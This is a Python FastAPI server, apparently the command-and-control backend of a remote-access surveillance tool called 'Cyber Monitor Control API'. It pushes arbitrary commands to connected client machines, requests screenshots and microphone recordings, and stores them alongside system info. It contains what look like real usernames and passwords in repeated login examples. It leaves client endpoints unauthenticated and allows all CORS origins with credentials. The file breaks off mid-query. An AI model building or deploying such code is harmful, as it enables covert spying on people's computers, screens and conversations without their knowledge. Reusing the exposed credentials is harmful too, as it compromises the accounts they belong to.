import os
import sys
import logging
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
from typing import List, Dict, Optional, Any
from datetime import datetime, timedelta
import secrets
import json
import jwt
import asyncio
import time
from supabase import create_client, Client
import psycopg2
from psycopg2.extras import RealDictCursor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Create FastAPI app
app = FastAPI(
    title="Cyber Monitor Control API",
    version="3.0",
    description="Client monitoring and management system",
    docs_url="/docs",
    redoc_url="/redoc",
    openapi_url="/openapi.json"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
PORT = int(os.getenv("PORT", "8000"))
DATABASE_URL = os.getenv("DATABASE_URL", "")

# Database connection pool
db_pool = None

# Security
security = HTTPBearer()

# ========== DATA MODELS ==========
class LoginRequest(BaseModel):
    email: str = Field(..., example="Kizer")
    password: str = Field(..., example="kidraper67")

class LoginRequest(BaseModel):
    email: str = Field(..., example="xotiic")
    password: str = Field(..., example="40671Mps19")

class LoginRequest(BaseModel):
    email: str = Field(..., example="nathan")
    password: str = Field(..., example="femboy67")

class ClientRegister(BaseModel):
    client_id: str = Field(..., example="client-001")
    name: str = Field(..., example="Office Computer")
    ip_address: str = Field(..., example="192.168.1.100")
    os_info: str = Field(default="Unknown", example="Windows 11")

class CommandRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    command: str = Field(..., example="get_processes")
    parameters: Dict[str, Any] = Field(default_factory=dict)

class ScreenshotUpload(BaseModel):
    client_id: str = Field(..., example="client-001")
    image_data: str = Field(..., description="Base64 encoded image")
    filename: str = Field(..., example="screenshot_2024.png")

class AudioUpload(BaseModel):
    client_id: str = Field(..., example="client-001")
    audio_data: str = Field(..., description="Base64 encoded audio")
    filename: str = Field(..., example="recording_2024.mp3")

class LogEntry(BaseModel):
    client_id: str = Field(..., example="client-001")
    log_type: str = Field(..., example="info")
    message: str = Field(..., example="System started")

# ========== DATABASE FUNCTIONS ==========
def get_db_connection():
    """Get PostgreSQL database connection"""
    global db_pool
    
    try:
        # Try to get database URL from environment
        db_url = DATABASE_URL
        
        if not db_url and SUPABASE_URL:
            # Extract database URL from Supabase URL
            # Supabase format: https://project-ref.supabase.co
            # Database format: postgresql://postgres:password@aws-0-us-east-1.pooler.supabase.com:5432/postgres
            if "supabase.co" in SUPABASE_URL:
                # Parse project reference
                import re
                match = re.search(r'https://([^.]+)\.supabase\.co', SUPABASE_URL)
                if match:
                    project_ref = match.group(1)
                    # Get password from environment
                    db_password = os.getenv("SUPABASE_DB_PASSWORD", "")
                    if db_password:
                        db_url = f"postgresql://postgres:{db_password}@aws-0-us-east-1.pooler.supabase.com:5432/postgres"
        
        if not db_url:
            logger.error("No database URL provided")
            return None
        
        # Ensure proper connection string
        if db_url.startswith("postgresql://"):
            conn = psycopg2.connect(db_url, cursor_factory=RealDictCursor)
            return conn
        else:
            logger.error(f"Invalid database URL format: {db_url[:50]}...")
            return None
            
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        return None

def execute_query(query: str, params: tuple = None):
    """Execute a database query"""
    conn = None
    try:
        conn = get_db_connection()
        if not conn:
            raise Exception("No database connection")
        
        cursor = conn.cursor()
        cursor.execute(query, params or ())
        
        if query.strip().upper().startswith("SELECT"):
            result = cursor.fetchall()
        else:
            conn.commit()
            result = cursor.rowcount
        
        cursor.close()
        conn.close()
        return result
        
    except Exception as e:
        logger.error(f"Query execution error: {e}")
        if conn:
            conn.rollback()
            conn.close()
        raise e

# ========== SECURITY FUNCTIONS ==========
def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "iss": "cyber-monitor-api"
    })
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str) -> Optional[dict]:
    """Verify JWT token"""
    try:
        payload = jwt.decode(
            token, 
            JWT_SECRET_KEY, 
            algorithms=["HS256"],
            options={"verify_exp": True, "verify_iss": True}
        )
        return payload
    except jwt.ExpiredSignatureError:
        logger.warning("JWT token expired")
        return None
    except jwt.InvalidTokenError as e:
        logger.warning(f"Invalid JWT token: {e}")
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    """Verify JWT token from request"""
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired authentication token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = []

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections.append(websocket)
        logger.info(f"👑 Admin connected. Total admins: {len(self.admin_connections)}")

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        logger.info(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
        
        # Update client status in database
        try:
            execute_query("""
                UPDATE clients 
                SET online = true, last_seen = NOW()
                WHERE client_id = %s
            """, (client_id,))
        except Exception as e:
            logger.error(f"Client status update error: {e}")
        
        # Notify admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat(),
            "total_clients": len(self.client_connections)
        })

    def disconnect(self, websocket: WebSocket):
        # Remove from admin connections
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)
            logger.info(f"👑 Admin disconnected. Total admins: {len(self.admin_connections)}")
        
        # Remove from client connections
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            logger.info(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
            
            # Update client status in database
            try:
                execute_query("""
                    UPDATE clients 
                    SET online = false
                    WHERE client_id = %s
                """, (client_id,))
            except Exception as e:
                logger.error(f"Client status update error: {e}")
            
            # Notify admins
            asyncio.create_task(self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat(),
                "total_clients": len(self.client_connections)
            }))

    async def notify_admins(self, message: dict):
        """Send message to all admin connections"""
        disconnected = []
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                logger.error(f"Failed to send to admin: {e}")
                disconnected.append(connection)
        
        # Remove disconnected admins
        for connection in disconnected:
            if connection in self.admin_connections:
                self.admin_connections.remove(connection)

    async def send_to_client(self, client_id: str, message: dict) -> bool:
        """Send message to specific client"""
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except Exception as e:
                logger.error(f"Failed to send to client {client_id}: {e}")
                # Remove disconnected client
                if client_id in self.client_connections:
                    del self.client_connections[client_id]
                return False
        return False

manager = ConnectionManager()

# ========== API ROUTES ==========
@app.post("/api/login", response_model=dict)
async def login(data: LoginRequest):
    """Login endpoint with PostgreSQL crypt verification"""
    try:
        logger.info(f"Login attempt for user: {data.email}")
        
        # Verify password using PostgreSQL crypt function
        result = execute_query("""
            SELECT id, email, is_admin, 
                   password_hash = crypt(%s, password_hash) as password_match
            FROM users 
            WHERE email = %s AND is_active = true
        """, (data.password, data.email))
        
        if not result or not result[0]['password_match']:
            logger.warning(f"Invalid credentials for user: {data.email}")
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        user = result[0]
        logger.info(f"✅ User authenticated: {user['email']}")
        
        # Create JWT token
        token_data = {
            "sub": user["email"],
            "email": user["email"],
            "is_admin": user.get("is_admin", False),
            "user_id": str(user["id"])
        }
        access_token = create_jwt_token(token_data)
        
        # Update last login
        try:
            execute_query("""
                UPDATE users 
                SET last_login = NOW() 
                WHERE id = %s
            """, (user["id"],))
        except Exception as e:
            logger.error(f"Update last login error: {e}")
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user["email"],
                "is_admin": user.get("is_admin", False),
                "user_id": str(user["id"])
            },
            "expires_in": 86400
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client", response_model=dict)
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        # Get client IP from request
        if not data.ip_address or data.ip_address == "127.0.0.1":
            client_ip = request.headers.get('X-Forwarded-For', request.client.host)
            if client_ip:
                data.ip_address = client_ip.split(',')[0].strip()
            else:
                data.ip_address = "Unknown"
        
        # Check if client exists
        existing = execute_query("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
        
        if existing:
            # Update existing client
            execute_query("""
                UPDATE clients 
                SET name = %s, ip_address = %s, os_info = %s, 
                    last_seen = NOW(), online = true, updated_at = NOW()
                WHERE client_id = %s
                RETURNING id
            """, (data.name, data.ip_address, data.os_info, data.client_id))
            
            client_id = existing[0]['id']
            action = "updated"
        else:
            # Create new client
            result = execute_query("""
                INSERT INTO clients (client_id, name, ip_address, os_info, last_seen, online)
                VALUES (%s, %s, %s, %s, NOW(), true)
                RETURNING id
            """, (data.client_id, data.name, data.ip_address, data.os_info))
            
            client_id = result[0]['id']
            action = "registered"
        
        # Add log entry
        try:
            execute_query("""
                INSERT INTO logs (client_id, log_type, message)
                VALUES (%s, 'info', %s)
            """, (client_id, f"Client {action}: {data.name} ({data.client_id})"))
        except Exception as e:
            logger.error(f"Log insertion error: {e}")
        
        logger.info(f"Client {action}: {data.client_id}")
        
        return {
            "success": True, 
            "message": f"Client {action} successfully",
            "client_id": data.client_id,
            "action": action
        }
        
    except Exception as e:
        logger.error(f"Client registration error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/clients", response_model=dict)
async def get_clients(
    user: dict = Depends(authenticate_user),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=1000),
    online_only: bool = Query(False),
    search: Optional[str] = Query(None)
):
    """Get all clients from database"""
    try:
        offset = (page - 1) * limit
        
        # Build query
        query = """
            SELECT id, client_id, name, ip_address, os_info, 
                   online, last_seen, registered_at, created_at
            FROM clients 
            WHERE 1=1
        """
        params = []
        
        if online_only:
            query += " AND online = true"
        
        if search:
            query += " AND (client_id ILIKE %s OR name ILIKE %s OR ip_address ILIKE %s)"
            search_term = f"%{search}%"
            params.extend([search_term, search_term, search_term])
        
        # Get total count
        count_query = "SELECT COUNT(*) as total FROM clients WHERE 1=1"
        count_params = []
        
        if online_only:
            count_query += " AND online = true"
        
        if search:
            count_query += " AND (client_id ILIKE %s OR name ILIKE %s OR ip_address ILIKE %s)"
            count_params.extend([search_term, search_term, search_term])
        
        total_result = execute_query(count_query, count_params)
        total = total_result[0]['total'] if total_result else 0
        
        # Get paginated results
        query += " ORDER BY last_seen DESC NULLS LAST LIMIT %s OFFSET %s"
        params.extend([limit, offset])
        
        clients = execute_query(query, params)
        
        return {
            "success": True,
            "clients": clients or [],
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit if limit > 0 else 0
            }
        }
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/client/{client_id}", response_model=dict)
async def get_client(client_id: str, user: dict = Depends(authenticate_user)):
    """Get specific client details"""
    try:
        # Get client
        client_result = execute_query("""
            SELECT id, client_id, name, ip_address, os_info, 
                   online, last_seen, registered_at
            FROM clients 
            WHERE client_id = %s
        """, (client_id,))
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        client = client_result[0]
        
        # Get recent logs for this client
        logs_result = execute_query("""
            SELECT log_type, message, created_at
            FROM logs 
            WHERE client_id = %s
            ORDER BY created_at DESC 
            LIMIT 20
        """, (client['id'],))
        
        return {
            "success": True,
            "client": client,
            "recent_logs": logs_result or [],
            "is_online": client_id in manager.client_connections
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get client error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/command", response_model=dict)
async def send_command(data: CommandRequest, user: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        # Get client from database
        client_result = execute_query("""
            SELECT id FROM clients WHERE client_id = %s
        """, (data.client_id,))
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        db_client_id = client_result[0]['id']
        
        # Create command record
        command_result = execute_query("""
            INSERT INTO commands (client_id, command, parameters, status)
            VALUES (%s, %s, %s::jsonb, 'pending')
            RETURNING id
        """, (db_client_id, data.command, json.dumps(data.parameters)))
        
        command_id = command_result[0]['id']
        
        # Send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": str(command_id),
            "command": data.command,
            "parameters": data.parameters,
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user["email"]
        })
        
        if not sent:
            # Update command status if WebSocket failed
            execute_query("""
                UPDATE commands 
                SET status = 'failed', error = 'Client not connected'
                WHERE id = %s
            """, (command_id,))
        
        return {
            "success": True,
            "command_id": str(command_id),
            "sent_via_websocket": sent,
            "client_id": data.client_id,
            "message": "Command queued for execution"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send command error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/commands", response_model=dict)
async def get_commands(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=1000)
):
    """Get recent commands"""
    try:
        offset = (page - 1) * limit
        
        # Build query
        query = """
            SELECT c.id, cl.client_id, cl.name as client_name, 
                   c.command, c.parameters, c.status, c.result, c.error,
                   c.created_at, c.completed_at
            FROM commands c
            JOIN clients cl ON c.client_id = cl.id
            WHERE 1=1
        """
        params = []
        
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        if status:
            query += " AND c.status = %s"
            params.append(status)
        
        # Get total count
        count_query = """
            SELECT COUNT(*) as total
            FROM commands c
            JOIN clients cl ON c.client_id = cl.id
            WHERE 1=1
        """
        count_params = []
        
        if client_id:
            count_query += " AND cl.client_id = %s"
            count_params.append(client_id)
        
        if status:
            count_query += " AND c.status = %s"
            count_params.append(status)
        
        total_result = execute_query(count_query, count_params)
        total = total_result[0]['total'] if total_result else 0
        
        # Get paginated results
        query += " ORDER BY c.created_at DESC LIMIT %s OFFSET %s"
        params.extend([limit, offset])
        
        commands = execute_query(query, params)
        
        # Format the response
        formatted_commands = []
        for cmd in (commands or []):
            formatted_cmd = dict(cmd)
            formatted_cmd["client"] = {
                "client_id": cmd["client_id"],
                "name": cmd["client_name"]
            }
            del formatted_cmd["client_name"]
            formatted_commands.append(formatted_cmd)
        
        return {
            "success": True,
            "commands": formatted_commands,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit if limit > 0 else 0
            }
        }
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/screenshot/{client_id}", response_model=dict)
async def request_screenshot(client_id: str, user: dict = Depends(authenticate_user)):
    """Request screenshot from client"""
    try:
        # Check if client exists
        client_result = execute_query("SELECT id FROM clients WHERE client_id = %s", (client_id,))
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "screenshot_request",
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user["email"]
        })
        
        if sent:
            return {
                "success": True,
                "message": "Screenshot request sent",
                "client_id": client_id
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Screenshot request error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/upload-screenshot", response_model=dict)
async def upload_screenshot(data: ScreenshotUpload, user: dict = Depends(authenticate_user)):
    """Upload screenshot from client"""
    try:
        # Get client ID
        client_result = execute_query("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        db_client_id = client_result[0]['id']
        
        # Store screenshot
        screenshot_result = execute_query("""
            INSERT INTO screenshots (client_id, image_data, filename)
            VALUES (%s, %s, %s)
            RETURNING id, created_at
        """, (db_client_id, data.image_data, data.filename))
        
        screenshot_id = screenshot_result[0]['id']
        
        # Notify admins
        await manager.notify_admins({
            "type": "screenshot_received",
            "client_id": data.client_id,
            "screenshot_id": screenshot_id,
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {
            "success": True,
            "screenshot_id": screenshot_id,
            "client_id": data.client_id,
            "filename": data.filename,
            "created_at": screenshot_result[0]['created_at'].isoformat()
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Screenshot upload error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/screenshots", response_model=dict)
async def get_screenshots(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    limit: int = Query(12, ge=1, le=100)
):
    """Get recent screenshots"""
    try:
        offset = (page - 1) * limit
        
        # Build query
        query = """
            SELECT s.id, cl.client_id, cl.name as client_name, 
                   s.filename, s.created_at
            FROM screenshots s
            JOIN clients cl ON s.client_id = cl.id
            WHERE 1=1
        """
        params = []
        
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        # Get total count
        count_query = """
            SELECT COUNT(*) as total
            FROM screenshots s
            JOIN clients cl ON s.client_id = cl.id
            WHERE 1=1
        """
        count_params = []
        
        if client_id:
            count_query += " AND cl.client_id = %s"
            count_params.append(client_id)
        
        total_result = execute_query(count_query, count_params)
        total = total_result[0]['total'] if total_result else 0
        
        # Get paginated results
        query += " ORDER BY s.created_at DESC LIMIT %s OFFSET %s"
        params.extend([limit, offset])
        
        screenshots = execute_query(query, params)
        
        # Format the response
        formatted_screenshots = []
        for scr in (screenshots or []):
            formatted_scr = dict(scr)
            formatted_scr["client"] = {
                "client_id": scr["client_id"],
                "name": scr["client_name"]
            }
            del formatted_scr["client_name"]
            formatted_screenshots.append(formatted_scr)
        
        return {
            "success": True,
            "screenshots": formatted_screenshots,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit if limit > 0 else 0
            }
        }
    except Exception as e:
        logger.error(f"Get screenshots error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/audio/{client_id}/record", response_model=dict)
async def record_audio(
    client_id: str, 
    duration: int = Query(10, ge=1, le=600),
    user: dict = Depends(authenticate_user)
):
    """Request audio recording from client"""
    try:
        # Check if client exists
        client_result = execute_query("SELECT id FROM clients WHERE client_id = %s", (client_id,))
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "audio_record",
            "duration": duration,
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user["email"]
        })
        
        if sent:
            return {
                "success": True,
                "message": f"Audio recording requested for {duration} seconds",
                "client_id": client_id,
                "duration": duration
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Audio record request error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/upload-audio", response_model=dict)
async def upload_audio(data: AudioUpload, user: dict = Depends(authenticate_user)):
    """Upload audio recording from client"""
    try:
        # Get client ID
        client_result = execute_query("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
        
        if not client_result:
            raise HTTPException(status_code=404, detail="Client not found")
        
        db_client_id = client_result[0]['id']
        
        # Store audio
        audio_result = execute_query("""
            INSERT INTO audio_recordings (client_id, audio_data, filename)
            VALUES (%s, %s, %s)
            RETURNING id, created_at
        """, (db_client_id, data.audio_data, data.filename))
        
        audio_id = audio_result[0]['id']
        
        # Notify admins
        await manager.notify_admins({
            "type": "audio_received",
            "client_id": data.client_id,
            "audio_id": audio_id,
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {
            "success": True,
            "audio_id": audio_id,
            "client_id": data.client_id,
            "filename": data.filename,
            "created_at": audio_result[0]['created_at'].isoformat()
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Audio upload error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/audio", response_model=dict)
async def get_audio(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    limit: int = Query(10, ge=1, le=100)
):
    """Get recent audio recordings"""
    try:
        offset = (page - 1) * limit
        
        # Build query
        query = """
            SELECT a.id, cl.client_id, cl.name as client_name, 
                   a.filename, a.created_at
            FROM audio_recordings a
            JOIN clients cl ON a.client_id = cl.id
            WHERE 1=1
        """
        params = []
        
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        # Get total count
        count_query = """
            SELECT COUNT(*) as total
            FROM audio_recordings a
            JOIN clients cl ON a.client_id = cl.id
            WHERE 1=1
        """
        count_params = []
        
        if client_id:
            count_query += " AND cl.client_id = %s"
            count_params.append(client_id)
        
        total_result = execute_query(count_query, count_params)
        total = total_result[0]['total'] if total_result else 0
        
        # Get paginated results
        query += " ORDER BY a.created_at DESC LIMIT %s OFFSET %s"
        params.extend([limit, offset])
        
        audio_recordings = execute_query(query, params)
        
        # Format the response
        formatted_audio = []
        for aud in (audio_recordings or []):
            formatted_aud = dict(aud)
            formatted_aud["client"] = {
                "client_id": aud["client_id"],
                "name": aud["client_name"]
            }
            del formatted_aud["client_name"]
            formatted_audio.append(formatted_aud)
        
        return {
            "success": True,
            "audio_recordings": formatted_audio,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit if limit > 0 else 0
            }
        }
    except Exception as e:
        logger.error(f"Get audio error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/logs", response_model=dict)
async def get_logs(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    log_type: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    limit: int = Query(100, ge=1, le=1000)
):
    """Get system logs"""
    try:
        offset = (page - 1) * limit
        
        # Build query
        query = """
            SELECT l.id, cl.client_id, cl.name as client_name, 
                   l.log_type, l.message, l.created_at
            FROM logs l
            JOIN clients cl ON l.client_id = cl.id
            WHERE 1=1
        """
        params = []
        
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        if log_type and log_type != "all":
            query += " AND l.log_type = %s"
            params.append(log_type)
        
        # Get total count
        count_query = """
            SELECT COUNT(*) as total
            FROM logs l
            JOIN clients cl ON l.client_id = cl.id
            WHERE 1=1
        """
        count_params = []
        
        if client_id:
            count_query += " AND cl.client_id = %s"
            count_params.append(client_id)
        
        if log_type and log_type != "all":
            count_query += " AND l.log_type = %s"
            count_params.append(log_type)
        
        total_result = execute_query(count_query, count_params)
        total = total_result[0]['total'] if total_result else 0
        
        # Get paginated results
        query += " ORDER BY l.created_at DESC LIMIT %s OFFSET %s"
        params.extend([limit, offset])
        
        logs = execute_query(query, params)
        
        # Format the response
        formatted_logs = []
        for log in (logs or []):
            formatted_log = dict(log)
            formatted_log["client"] = {
                "client_id": log["client_id"],
                "name": log["client_name"]
            }
            del formatted_log["client_name"]
            formatted_logs.append(formatted_log)
        
        return {
            "success": True,
            "logs": formatted_logs,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit if limit > 0 else 0
            }
        }
    except Exception as e:
        logger.error(f"Get logs error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    """WebSocket endpoint for admin dashboard"""
    try:
        await manager.connect_admin(websocket)
        
        while True:
            data = await websocket.receive_json()
            logger.info(f"Admin WebSocket message: {data}")
            
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Admin WebSocket error: {e}")
        manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    """WebSocket endpoint for client connections"""
    try:
        await manager.connect_client(websocket, client_id)
        
        while True:
            data = await websocket.receive_json()
            data_type = data.get("type")
            
            if data_type == "heartbeat":
                # Update last seen
                try:
                    execute_query("""
                        UPDATE clients 
                        SET last_seen = NOW(), online = true
                        WHERE client_id = %s
                    """, (client_id,))
                except Exception as e:
                    logger.error(f"Heartbeat update error: {e}")
                
            elif data_type == "command_result":
                # Update command status
                try:
                    execute_query("""
                        UPDATE commands 
                        SET status = 'completed', 
                            result = %s, 
                            completed_at = NOW(),
                            error = %s
                        WHERE id = %s
                    """, (
                        data.get("result"),
                        data.get("error"),
                        data.get("command_id")
                    ))
                except Exception as e:
                    logger.error(f"Command result update error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "command_id": data.get("command_id"),
                    "command": data.get("command"),
                    "result": data.get("result"),
                    "error": data.get("error"),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "log":
                # Store log
                try:
                    client_result = execute_query("SELECT id FROM clients WHERE client_id = %s", (client_id,))
                    if client_result:
                        execute_query("""
                            INSERT INTO logs (client_id, log_type, message)
                            VALUES (%s, %s, %s)
                        """, (
                            client_result[0]['id'],
                            data.get("log_type", "info"),
                            data.get("message", "")
                        ))
                except Exception as e:
                    logger.error(f"Log storage error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "client_log",
                    "client_id": client_id,
                    "log_type": data.get("log_type", "info"),
                    "message": data.get("message", ""),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "system_info":
                # Store system info
                try:
                    client_result = execute_query("SELECT id FROM clients WHERE client_id = %s", (client_id,))
                    if client_result:
                        execute_query("""
                            INSERT INTO system_info (client_id, info)
                            VALUES (%s, %s::jsonb)
                        """, (
                            client_result[0]['id'],
                            json.dumps(data.get("info", {}))
                        ))
                except Exception as e:
                    logger.error(f"System info storage error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "system_info",
                    "client_id": client_id,
                    "info": data.get("info", {}),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Client WebSocket error: {e}")
        manager.disconnect(websocket)

# ========== HEALTH AND INFO ==========
@app.get("/api/health", response_model=dict)
async def health_check():
    """Health check endpoint"""
    try:
        # Test database connection
        db_conn = get_db_connection()
        if db_conn:
            db_conn.close()
            db_status = "connected"
        else:
            db_status = "disconnected"
        
        health_status = {
            "status": "healthy" if db_status == "connected" else "degraded",
            "timestamp": datetime.utcnow().isoformat(),
            "version": "3.0",
            "database": db_status,
            "active_clients": len(manager.client_connections),
            "active_admins": len(manager.admin_connections),
        }
        
        return health_status
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return {
            "status": "unhealthy",
            "timestamp": datetime.utcnow().isoformat(),
            "error": str(e)
        }

@app.get("/", response_model=dict)
async def root():
    """Root endpoint with API info"""
    return {
        "message": "🚀 Cyber Monitor Control API",
        "version": "3.0",
        "status": "running",
        "timestamp": datetime.utcnow().isoformat(),
        "documentation": "/docs",
        "websocket_endpoints": {
            "admin": "/ws/admin",
            "client": "/ws/client/{client_id}"
        }
    }

# ========== ERROR HANDLERS ==========
@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    """Handle HTTP exceptions"""
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "success": False,
            "error": exc.detail,
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    """Handle all other exceptions"""
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={
            "success": False,
            "error": "Internal server error",
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

# ========== APPLICATION STARTUP ==========
@app.on_event("startup")
async def startup_event():
    """Initialize application on startup"""
    logger.info(f"🚀 Starting Cyber Monitor Control API v3.0")
    logger.info(f"📡 Port: {PORT}")
    
    # Test database connection
    db_conn = get_db_connection()
    if db_conn:
        try:
            # Test connection with a simple query
            cursor = db_conn.cursor()
            cursor.execute("SELECT COUNT(*) as count FROM users")
            result = cursor.fetchone()
            logger.info(f"✅ Database connected - Users: {result['count']}")
            
            # Test all tables exist
            cursor.execute("""
                SELECT table_name 
                FROM information_schema.tables 
                WHERE table_schema = 'public'
                AND table_name IN ('users', 'clients', 'commands', 'screenshots', 'audio_recordings', 'logs', 'system_info')
